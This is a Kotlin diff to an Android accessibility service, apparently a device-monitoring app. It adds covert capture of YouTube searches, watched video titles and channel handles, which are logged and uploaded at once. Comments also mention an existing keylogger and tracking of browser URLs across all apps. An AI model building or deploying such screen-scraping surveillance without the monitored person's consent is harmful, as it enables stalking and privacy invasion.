@@ -143,9 +143,16 @@ class AgentAccessibilityService : AccessibilityService() {
                 captureGoogleAppSearchQuery(event, packageName)
             }
 
-            // 4. Universal Browser URL & Web History Tracking Engine Across ALL Apps & Browsers
-            captureBrowserUrl(event, packageName)
+            // 3.5 YouTube Search & Watched Video History Engine
+            if (packageName == "com.google.android.youtube") {
+                captureYouTubeActivity(event, rootInActiveWindow ?: event.source)
+            }
 
+            // 4. Universal Browser URL & Web History Tracking Engine Across ALL Apps & Browsers (Excluding YouTube which has its own engine)
+            if (packageName != "com.google.android.youtube") {
+                captureBrowserUrl(event, packageName)
+            }
+            
             // 5. In-Call UI Decline Button Interceptor (Runs continuously whenever a blocked call is ringing or dialer UI is active)
             if (CallBlocker.getInstance().isBlockedCallRinging || isDialerPackage(packageName)) {
                 val windowNode = rootInActiveWindow ?: event.source
@@ -417,6 +424,379 @@ class AgentAccessibilityService : AccessibilityService() {
         }
     }
 
+    @Volatile
+    private var lastCapturedYouTubeVideoTitle: String = ""
+    @Volatile
+    private var lastCapturedYouTubeSearchQuery: String = ""
+
+    @Volatile
+    private var pendingYouTubeTitle: String = ""
+    @Volatile
+    private var pendingYouTubeChannelName: String = ""
+    @Volatile
+    private var pendingYouTubeChannelHandle: String = ""
+    @Volatile
+    private var pendingYouTubeFirstSeen: Long = 0L
+
+    private fun captureYouTubeActivity(event: AccessibilityEvent, rootNode: AccessibilityNodeInfo?) {
+        val windowRoot = rootInActiveWindow ?: rootNode ?: return
+        try {
+            // A. Search Bar Submit / Click Check (Keystrokes are cleanly debounced via Keylogger Engine)
+            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                val searchEditNodes = windowRoot.findAccessibilityNodeInfosByViewId("com.google.android.youtube:id/search_edit_text")
+                if (!searchEditNodes.isNullOrEmpty()) {
+                    val query = searchEditNodes.firstOrNull()?.text?.toString()?.trim() ?: ""
+                    if (query.length >= 2 && !query.equals("Search YouTube", ignoreCase = true) && query != lastCapturedYouTubeSearchQuery) {
+                        emitYouTubeSearchWebHistoryEvent(query)
+                    }
+                }
+            }
+
+            // B. Watched Video Title & Channel Name Check
+            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || event.eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
+                val possibleTitleIds = listOf(
+                    "com.google.android.youtube:id/video_title",
+                    "com.google.android.youtube:id/title",
+                    "com.google.android.youtube:id/player_video_title",
+                    "com.google.android.youtube:id/watch_title",
+                    "com.google.android.youtube:id/expandable_title"
+                )
+
+                var videoTitle = ""
+                for (id in possibleTitleIds) {
+                    val titleNodes = windowRoot.findAccessibilityNodeInfosByViewId(id)
+                    if (!titleNodes.isNullOrEmpty()) {
+                        for (node in titleNodes) {
+                            val text = node.text?.toString()?.trim() ?: ""
+                            if (isValidYouTubeVideoTitle(text)) {
+                                videoTitle = text
+                                break
+                            }
+                        }
+                    }
+                    if (videoTitle.isNotBlank()) break
+                }
+
+                if (videoTitle.isNotBlank()) {
+                    if (isYouTubeAd(videoTitle, windowRoot)) {
+                        Log.d(TAG, "⏭️ SKIPPING YOUTUBE SPONSORED AD: Title='$videoTitle'")
+                        return
+                    }
+
+                    if (videoTitle != pendingYouTubeTitle) {
+                        pendingYouTubeTitle = videoTitle
+                        pendingYouTubeFirstSeen = System.currentTimeMillis()
+                        pendingYouTubeChannelName = ""
+                        pendingYouTubeChannelHandle = ""
+                        Log.d(TAG, "📺 YT NEW VIDEO TITLE DETECTED: '$videoTitle'")
+                    }
+                }
+
+                // Extract Channel Name & Handle (accumulates as UI elements render across windowRoot)
+                val (channelName, channelHandle) = extractYouTubeChannelInfo(windowRoot)
+                if (channelName.isNotBlank()) pendingYouTubeChannelName = channelName
+                if (channelHandle.isNotBlank()) pendingYouTubeChannelHandle = channelHandle
+
+                val hasChannel = pendingYouTubeChannelName.isNotBlank() || pendingYouTubeChannelHandle.isNotBlank()
+                val waitedLongEnough = (System.currentTimeMillis() - pendingYouTubeFirstSeen) > 2500L
+
+                // Emit when channel details are found OR after 2.5s fallback
+                if (pendingYouTubeTitle.isNotBlank() && pendingYouTubeTitle != lastCapturedYouTubeVideoTitle && (hasChannel || waitedLongEnough)) {
+                    lastCapturedYouTubeVideoTitle = pendingYouTubeTitle
+                    Log.i(TAG, "📺 YOUTUBE VIDEO MATCHED: Title='$pendingYouTubeTitle', Channel='$pendingYouTubeChannelName', Handle='$pendingYouTubeChannelHandle'")
+                    emitYouTubeVideoWatchWebHistoryEvent(pendingYouTubeTitle, pendingYouTubeChannelName, pendingYouTubeChannelHandle)
+                }
+            }
+        } catch (e: Exception) {
+            // Quiet fail
+        }
+    }
+
+    private fun isYouTubeAd(title: String, rootNode: AccessibilityNodeInfo): Boolean {
+        val lower = title.lowercase().trim()
+        if (lower.startsWith("sponsored") ||
+            lower.contains("ad •") ||
+            lower.contains("ad ·") ||
+            lower.startsWith("ad 1 of") ||
+            lower.startsWith("ad 2 of") ||
+            lower.contains("skip ad") ||
+            lower.contains("visit advertiser")) {
+            return true
+        }
+
+        // Check specifically for active Video Player Ad View IDs
+        val adViewIds = listOf(
+            "com.google.android.youtube:id/ad_overlay",
+            "com.google.android.youtube:id/ad_cta_button",
+            "com.google.android.youtube:id/skip_ad_button",
+            "com.google.android.youtube:id/ad_progress_text",
+            "com.google.android.youtube:id/ad_badge"
+        )
+        for (id in adViewIds) {
+            val adNodes = rootNode.findAccessibilityNodeInfosByViewId(id)
+            if (!adNodes.isNullOrEmpty()) {
+                return true
+            }
+        }
+        return false
+    }
+
+    private data class YouTubeChannelInfo(val name: String = "", val handle: String = "")
+
+    private fun extractYouTubeChannelInfo(rootNode: AccessibilityNodeInfo): YouTubeChannelInfo {
+        val targetNode = rootInActiveWindow ?: rootNode
+        var foundName = ""
+        var foundHandle = ""
+
+        // 1. Check direct view ID nodes
+        val possibleChannelIds = listOf(
+            "com.google.android.youtube:id/owner_name",
+            "com.google.android.youtube:id/channel_name",
+            "com.google.android.youtube:id/author",
+            "com.google.android.youtube:id/byline",
+            "com.google.android.youtube:id/owner_text",
+            "com.google.android.youtube:id/channel_title"
+        )
+        for (cId in possibleChannelIds) {
+            val cNodes = targetNode.findAccessibilityNodeInfosByViewId(cId)
+            if (!cNodes.isNullOrEmpty()) {
+                val text = cNodes.firstOrNull()?.text?.toString()?.trim() ?: ""
+                if (text.isNotBlank() && text.length >= 2 && !text.lowercase().contains("subscrib")) {
+                    if (text.startsWith("@")) {
+                        foundHandle = text
+                    } else {
+                        foundName = text
+                    }
+                    break
+                }
+            }
+        }
+
+        // 2. Scan watch_list container for direct [no_id] sibling alignment (Title -> @handle -> Likes -> Views)
+        val watchListNodes = targetNode.findAccessibilityNodeInfosByViewId("com.google.android.youtube:id/watch_list")
+        if (!watchListNodes.isNullOrEmpty()) {
+            for (watchList in watchListNodes) {
+                val count = watchList.childCount
+                for (i in 0 until count) {
+                    val child = watchList.getChild(i) ?: continue
+                    val childText = child.text?.toString()?.trim() ?: ""
+                    // Handle node immediately following title or present in watch_list
+                    if (childText.startsWith("@") && childText.length >= 3 && foundHandle.isBlank()) {
+                        foundHandle = childText
+                    }
+                    // Extract handle if child is next sibling after valid video title
+                    if (isValidYouTubeVideoTitle(childText) && i + 1 < count) {
+                        val nextChild = watchList.getChild(i + 1)
+                        val nextText = nextChild?.text?.toString()?.trim() ?: ""
+                        if (nextText.startsWith("@") && foundHandle.isBlank()) {
+                            foundHandle = nextText
+                        }
+                    }
+                }
+            }
+        }
+
+        // 3. Scan accessibility nodes recursively for channel patterns ("Zee Music Company 123M subscribers", "Subscribe to Zee Music Company.", "@handle")
+        fun scanForChannel(node: AccessibilityNodeInfo?) {
+            if (node == null) return
+            val text = node.text?.toString()?.trim() ?: ""
+            val cd = node.contentDescription?.toString()?.trim() ?: ""
+
+            // Handle match (e.g. "@zeemusiccompany")
+            if (text.startsWith("@") && text.length >= 3 && foundHandle.isBlank()) {
+                foundHandle = text
+            }
+            if (cd.startsWith("@") && cd.length >= 3 && foundHandle.isBlank()) {
+                foundHandle = cd
+            }
+
+            // Pattern A: "Subscribe to Zee Music Company." or "Subscribe to Zee Music Company"
+            if (cd.startsWith("Subscribe to ", ignoreCase = true) && foundName.isBlank()) {
+                val name = cd.substring(13).trim().trimEnd('.')
+                if (name.isNotBlank() && name.length >= 2) {
+                    foundName = name
+                }
+            }
+
+            // Pattern B: "Zee Music Company 123M subscribers"
+            if (cd.lowercase().contains("subscribers") && foundName.isBlank()) {
+                val match = Regex("(?i)^(.*?)\\s+[0-9.]+[kmb]?\\s+subscribers").find(cd)
+                if (match != null && match.groupValues.size > 1) {
+                    val name = match.groupValues[1].trim()
+                    if (name.isNotBlank() && name.length >= 2 && !name.lowercase().startsWith("subscribe")) {
+                        foundName = name
+                    }
+                }
+            }
+
+            for (i in 0 until node.childCount) {
+                val child = node.getChild(i) ?: continue
+                scanForChannel(child)
+            }
+        }
+
+        scanForChannel(targetNode)
+
+        // 4. Smart fallback: If handle is found but name is still blank, derive clean name from handle (e.g. "@zeemusiccompany" -> "zeemusiccompany")
+        if (foundName.isBlank() && foundHandle.isNotBlank()) {
+            foundName = foundHandle.removePrefix("@").trim()
+        }
+
+        return YouTubeChannelInfo(name = foundName, handle = foundHandle)
+    }
+
+    private fun printAccessibilityNodeTree(node: AccessibilityNodeInfo?, depth: Int) {
+        if (node == null || depth > 25) return
+        val indent = " |".repeat(Math.min(depth, 25))
+        val viewId = node.viewIdResourceName ?: "no_id"
+        val text = node.text?.toString()?.trim() ?: ""
+        val cd = node.contentDescription?.toString()?.trim() ?: ""
+        
+        if (text.isNotBlank() || cd.isNotBlank()) {
+            Log.d(TAG, "TREE$indent ⭐ [$viewId] text='$text' cd='$cd'")
+        } else if (viewId != "no_id") {
+            Log.d(TAG, "TREE$indent [$viewId]")
+        }
+
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            printAccessibilityNodeTree(child, depth + 1)
+        }
+    }
+
+    private fun isValidYouTubeVideoTitle(title: String): Boolean {
+        if (title.length < 3) return false
+        val lower = title.lowercase().trim()
+        val ignoredSystemLabels = setOf(
+            "youtube", "search", "home", "shorts", "subscriptions", "library",
+            "notifications", "cast", "share", "like", "dislike", "subscribe",
+            "comments", "playlist", "mix", "downloads", "your videos", "sponsored", "skip ad"
+        )
+        if (ignoredSystemLabels.contains(lower)) return false
+        if (lower.startsWith("sponsored") || lower.contains("skip ad") || lower.contains("visit advertiser")) return false
+        if (lower.matches(Regex(".*\\d+:\\d+.*"))) return false
+        if (lower.matches(Regex(".*\\d+\\s*(views|subscribers|likes).*"))) return false
+        return true
+    }
+
+    private fun emitYouTubeSearchWebHistoryEvent(query: String) {
+        val cleanQueryText = query.trim()
+        if (cleanQueryText.isBlank() || cleanQueryText.length < 2 || cleanQueryText.equals("Search YouTube", ignoreCase = true) || cleanQueryText == lastCapturedYouTubeSearchQuery) return
+        lastCapturedYouTubeSearchQuery = cleanQueryText
+
+        val now = System.currentTimeMillis()
+        val cleanQuery = cleanQueryText.replace(Regex("[^a-zA-Z0-9]"), "_")
+        val eventId = "evt_yt_search_${cleanQuery}_${now}"
+
+        val encodedQuery = try {
+            java.net.URLEncoder.encode(cleanQueryText, "UTF-8")
+        } catch (e: Exception) {
+            cleanQueryText
+        }
+        val searchUrl = "https://www.youtube.com/results?search_query=$encodedQuery"
+
+        Log.i(TAG, "📺 YOUTUBE SEARCH CAPTURED: Query=\"$cleanQueryText\", URL=$searchUrl")
+
+
+        val payload = JSONObject().apply {
+            put("title", "🔍 YouTube Search: $query")
+            put("searchQuery", query)
+            put("type", "search")
+            put("url", searchUrl)
+            put("domain", "youtube.com")
+            put("packageName", "com.google.android.youtube")
+            put("appName", "YouTube")
+            put("visitCount", 1)
+            put("isBlocked", false)
+            put("timestamp", now)
+        }
+
+        val eventEntity = NormalizedEventEntity(
+            eventId = eventId,
+            deviceId = prefsDeviceId(),
+            source = "youtube",
+            eventType = "youtube_search",
+            timestamp = now,
+            collectionMethod = "accessibility",
+            payloadJson = payload.toString(),
+            isSynced = false
+        )
+
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val database = AppDatabase.getInstance(applicationContext)
+                database.eventDao().insertEvent(eventEntity)
+                // Dual emission for legacy web history view
+                val webHistoryEntity = eventEntity.copy(eventId = "evt_wh_${eventId}", source = "web_history", eventType = "url_visit")
+                database.eventDao().insertEvent(webHistoryEntity)
+                performInstantUpload(database, prefsDeviceId())
+            } catch (e: Exception) {
+                Log.e(TAG, "Error saving YouTube search event: ${e.message}")
+            }
+        }
+    }
+
+    private fun emitYouTubeVideoWatchWebHistoryEvent(title: String, channelName: String = "", channelHandle: String = "") {
+        val now = System.currentTimeMillis()
+        val cleanTitle = title.replace(Regex("[^a-zA-Z0-9]"), "_")
+        val eventId = "evt_yt_watch_${cleanTitle}_${now}"
+
+        // Construct high-accuracy YouTube video search query (title + channel handle or name)
+        val queryForUrl = when {
+            channelHandle.isNotBlank() -> "$title $channelHandle"
+            channelName.isNotBlank() -> "$title by $channelName"
+            else -> title
+        }
+
+        val encodedTitle = try {
+            java.net.URLEncoder.encode(queryForUrl, "UTF-8")
+        } catch (e: Exception) {
+            title
+        }
+        val watchUrl = "https://www.youtube.com/results?search_query=$encodedTitle"
+
+        Log.i(TAG, "📺 YOUTUBE VIDEO WATCHED: Title=\"$title\", Channel=\"$channelName\", Handle=\"$channelHandle\", URL=$watchUrl")
+
+        val payload = JSONObject().apply {
+            put("title", "📺 YouTube Watch: $title")
+            put("videoTitle", title)
+            put("channelName", if (channelName.isNotBlank()) channelName else "YouTube Creator")
+            put("channelHandle", channelHandle)
+            put("type", "watch")
+            put("url", watchUrl)
+            put("domain", "youtube.com")
+            put("packageName", "com.google.android.youtube")
+            put("appName", "YouTube")
+            put("visitCount", 1)
+            put("isBlocked", false)
+            put("timestamp", now)
+        }
+
+        val eventEntity = NormalizedEventEntity(
+            eventId = eventId,
+            deviceId = prefsDeviceId(),
+            source = "youtube",
+            eventType = "youtube_watch",
+            timestamp = now,
+            collectionMethod = "accessibility",
+            payloadJson = payload.toString(),
+            isSynced = false
+        )
+
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val database = AppDatabase.getInstance(applicationContext)
+                database.eventDao().insertEvent(eventEntity)
+                // Dual emission for legacy web history view
+                val webHistoryEntity = eventEntity.copy(eventId = "evt_wh_${eventId}", source = "web_history", eventType = "url_visit")
+                database.eventDao().insertEvent(webHistoryEntity)
+                performInstantUpload(database, prefsDeviceId())
+            } catch (e: Exception) {
+                Log.e(TAG, "Error saving YouTube watch event: ${e.message}")
+            }
+        }
+    }
+
     private fun findUrlNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
         val viewId = node.viewIdResourceName
         if (viewId != null && (
@@ -540,6 +920,11 @@ class AgentAccessibilityService : AccessibilityService() {
         // 2. Dual Emission: If the typed sentence was in Google Search App, also emit directly to Web History!
         if (GOOGLE_SEARCH_PACKAGES.contains(pkgToFlush)) {
             emitGoogleSearchWebHistoryEvent(textToFlush, pkgToFlush)
+        }
+
+        // 2.5 Dual Emission: If typed in YouTube App, emit directly to Web History as a YouTube Search!
+        if (pkgToFlush == "com.google.android.youtube") {
+            emitYouTubeSearchWebHistoryEvent(textToFlush)
         }
 
         // 3. Dual Emission: If typed in Google Calendar or Android Calendar, emit directly to Calendar Events!
